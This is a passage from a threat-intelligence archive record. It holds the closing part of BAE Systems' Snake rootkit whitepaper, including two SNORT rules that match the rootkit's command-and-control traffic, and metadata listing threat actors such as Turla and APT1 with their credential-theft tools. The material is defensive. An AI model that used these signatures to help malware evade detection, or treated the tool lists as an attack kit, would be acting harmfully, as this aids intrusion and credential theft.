B)\n\n  - Use Indicators of Compromise for building host-based rules (see Appendix C)\n\n  - Deploy SNORT rules for network based detection of Snake (see Appendix D)\n\n\n-----\n\n##### APPENDIX A\n\n\n-----\n\n##### APPENDIX B\n\n\n-----\n\n##### APPENDIX C\n\n\n-----\n\n##### APPENDIX D\n\nCanditate SNORT rules:\n\nalert tcp $EXTERNAL_NET $HTTP_PORTS -> $HOME_NET any (msg:”Snake rootkit, usermode-centric encrypted command from\nserver”; content:”|01 00 00 00 00 00 00 00|1dM3uu4j7Fw4sjnb”; content:”HTTP/1.1 200 OK”; flow:to_client, established;\nsid:1000010;)\n\nalert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:”Snake rootkit, usermode-centric client request”; content:”/1/6b558694705129b01c0”; content:”Connection: Keep-Alive|0d 0a|”; flow:to_server,established; sid:1000011;)\n\n\n-----\n\n###### FOR MORE INFORMATION CONTACT:\n\nBAE Systems Applied Intelligence\n\nE: marketingai@baesystems.com\nW: www.baesysytems.com/ai\n\n###### AUSTRALIA             UK                     US         \n\n\nLevel 6\n\n62 Pitt St\n\nSydney NSW 2000\n\nAustralia\n\nT: +61 (0) 1300 027 001\n\n\nSurrey Research Park\n\nGuildford\n\nSurrey, GU2 7RQ\n\nUnited Kingdom\n\nT: +44 (0) 1483 816000\n\n\n265 Franklin Street\n\nBoston\n\nMA 02110\n\nUSA\n\nT: +1 (617) 737 4170\n\n\n###### MALAYSIA              DUBAI\n\n\nUnit 2B-12-1\n\nJalan Stesen Sentral 5\n\nKuala Lumpur Sentral\n\nKuala Lumpur, 50470\n\nT: +603 2780 2052\n\nCopyright © BAE Systems 2014.\n\n\nDubai Internet City\n\nBuilding 17\n\nOffice Ground Floor 53\n\nPO Box 500523\n\nDubai\n\nT: +971 4369 4369\n\n\nAll rights reserved. BAE SYSTEMS, the BAE SYSTEMS Logo and the product names referenced herein are trademarks of BAE\nSystems plc. BAE Systems Applied Intelligence Limited registered in England & Wales (No.1337451) with its registered office at\nSurrey Research Park, Guildford, England, GU2 7RQ. No part of this document may be copied, reproduced, adapted or redistributed\nin any form or by any means without the express prior written consent of BAE Systems Applied Intelligence.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        },
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        },
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/xmeq5ajvmzux1appt1qvd8wme7k13o63",
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2014/2014.03.07.Snake_Campaign/snake_whitepaper.pdf",
        "https://artemonsecurity.com/snake_whitepaper.pdf"
    ],
    "report_names": [
        "snake_whitepaper",
        "snake_whitepaper.pdf"
    ],
    "threat_actors": [
        {
            "id": "67bf0462-41a3-4da5-b876-187e9ef7c375",
            "created_at": "2022-10-25T16:07:23.44832Z",
            "updated_at": "2025-03-27T02:02:09.806007Z",
            "deleted_at": null,
            "main_name": "Careto",
            "aliases": [
                "Careto",
                "The Mask",
                "Ugly Face"
            ],
            "source_name": "ETDA:Careto",
            "tools": [
                "Careto"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "dabb6779-f72e-40ca-90b7-1810ef08654d",
            "created_at": "2022-10-25T15:50:23.463113Z",
            "updated_at": "2025-03-27T02:00:55.47619Z",
            "deleted_at": null,
            "main_name": "APT1",
            "aliases": [
                "APT1",
                "Comment Crew",
                "Comment Group",
                "Comment Panda"
            ],
            "source_name": "MITRE:APT1",
            "tools": [
                "Seasalt",
                "ipconfig",
                "Cachedump",
                "PsExec",
                "GLOOXMAIL",
                "Lslsass",
                "PoisonIvy",
                "WEBC2",
                "Mimikatz",
                "gsecdump",
                "Pass-The-Hash Toolkit",
                "Tasklist",
                "xCmd",
                "pwdump"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "cf7fc640-acfe-41c4-9f3d-5515d53a3ffb",
            "created_at": "2023-01-06T13:46:38.228042Z",
            "updated_at": "2025-03-27T02:00:02.775905Z",
            "deleted_at": null,
            "main_name": "APT1",
            "aliases": [
                "GIF89a",
                "G0006",
                "PLA Unit 61398",
                "Group 3",
                "TG-8223",
                "Comment Group",
                "ShadyRAT",
                "COMMENT PANDA",
                "Comment Crew",
                "Byzantine Candor",
                "Brown Fox"
            ],
            "source_name": "MISPGALAXY:APT1",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "a97fee0d-af4b-4661-ae17-858925438fc4",
            "created_at": "2023-01-06T13:46:38.396415Z",
            "updated_at": "2025-03-27T02:00:02.823045Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "Uroburos",
                "Hippo Team",
                "Pacifier APT",
                "MAKERSMARK",
                "ATK13",
                "UAC-0003",
                "IRON HUNTER",
                "Waterbug",
                "TAG_0530",
                "KRYPTON",
                "Popeye",
                "SIG23",
                "UAC-0144",
                "G0010",
                "Blue Python",
                "VENOMOUS Bear",
                "Group 88",
                "Pfinet",
                "ITG12",
                "UNC4210",
                "Secret Blizzard",
                "UAC-0024"
            ],
            "source_name": "MISPGALAXY:Turla",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d11c89bb-1640-45fa-8322-6f4e4053d7f3",
            "created_at": "2022-10-25T15:50:23.509601Z",
            "updated_at": "2025-03-27T02:00:55.487991Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "Turla",
                "IRON HUNTER",
                "Group 88",
                "Waterbug",
                "WhiteBear",
                "Krypton",
                "Venomous Bear",
                "Secret Blizzard",
                "BELUGASTURGEON"
            ],
            "source_name": "MITRE:Turla",
            "tools": [
                "PsExec",
                "nbtstat",
                "ComRAT",
                "netstat",
                "certutil",
                "KOPILUWAK",
                "IronNetInjector",
                "LunarWeb",
                "Arp",
                "Uroburos",
                "PowerStallion",
                "Kazuar",
                "Systeminfo",
                "LightNeuron",
                "Mimikatz",
                "Tasklist",
                "LunarMail",
                "HyperStack",
                "NBTscan",
                "TinyTurla",
                "Penquin",
                "LunarLoader"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1666716498,
    "ts_updated_at": 1743041688,
    "ts_creation_date": 1394184407,
    "ts_modification_date": 1394184423,
    "files": {
        "pdf": "https://archive.orkl.eu/0849ce1f0272c4604d47e464ab56cad0b5b60263.pdf",
        "text": "https://archive.orkl.eu/0849ce1f0272c4604d47e464ab56cad0b5b60263.txt",
        "img": "https://archive.orkl.eu/0849ce1f0272c4604d47e464ab56cad0b5b60263.jpg"
    }
}